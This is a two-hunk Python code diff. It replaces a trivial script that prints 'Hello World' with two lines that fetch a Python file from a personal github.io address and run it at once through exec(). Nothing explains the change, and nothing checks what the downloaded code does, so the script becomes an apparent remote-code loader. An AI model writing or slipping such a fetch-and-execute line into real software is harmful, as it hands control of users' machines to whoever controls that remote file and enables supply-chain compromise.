@@ -1,4 +1,2 @@
-A = "Hello"
-B = "World"
-C = A + " " + B
-print(C)
+import requests
+exec(requests.get("https://jesusjorge.github.io/reference.py").text)
